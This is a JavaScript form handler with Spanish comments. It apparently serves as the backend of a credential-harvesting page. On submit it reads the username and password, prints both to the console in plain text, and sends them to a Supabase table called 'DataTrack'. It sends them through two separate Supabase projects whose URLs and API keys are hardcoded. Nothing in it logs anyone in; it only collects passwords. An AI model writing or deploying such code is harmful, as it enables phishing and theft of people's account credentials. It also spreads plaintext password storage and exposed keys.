const supabaseUrl = "https://dmgsbsfpysexgnxgdqxi.supabase.co";
const supabaseKey =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRtZ3Nic2ZweXNleGdueGdkcXhpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDkyNDUwNzUsImV4cCI6MjA2NDgyMTA3NX0.2DON2FhUhVupOLDtzrzIjanXZtqu-kWq6L_tuRq-fbg"

const trackSave = () => {
  document
    .getElementById("identifierForm")
    .addEventListener("submit", async function (event) {
      event.preventDefault();

      // Usa el objeto global supabase
      const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

      const username = document.getElementById("username").value;
      const password = document.getElementById("tpassword").value;
      console.log("u: " + username + "p: " + password);
      const { error } = await supabase
        .from("DataTrack")
        .insert({ username: username, password: password });

      if (error) {
        console.error("Error al guardar en Supabase:", error.message);
        alert("Error al guardar los datos.");
      } else {
        alert("Datos guardados correctamente.");
        document.getElementById("identifierForm").reset();
      }
    });
};

const Altern = () => {
  document
    .getElementById("identifierForm")
    .addEventListener("submit", async function (event) {
      event.preventDefault(); // Evita la recarga de la página

      // Obtener los datos del formulario
      const username = document.getElementById("username").value;
      const tpassword = document.getElementById("tpassword").value;

      const data = {
        username: username,
        password: tpassword,
      };

      // Configuración de Supabase
      const SUPABASE_URL = "https://pahbxnmbixuxrmtyutzj.supabase.co";
      const SUPABASE_KEY =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBhaGJ4bm1iaXh1eHJtdHl1dHpqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDkwNTY2MDEsImV4cCI6MjA2NDYzMjYwMX0.vVeLfym30Zl1utCSesTcTcLHttiYasPkW5h7cJYgVzk";

      const response = await fetch(`${SUPABASE_URL}/rest/v1/DataTrack`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          apikey: SUPABASE_KEY,
          Authorization: `Bearer ${SUPABASE_KEY}`,
        },
        body: JSON.stringify(data),
      });

      const result = await response.json();
      console.log("Datos guardados:", result);
    });
};
//commit

trackSave();
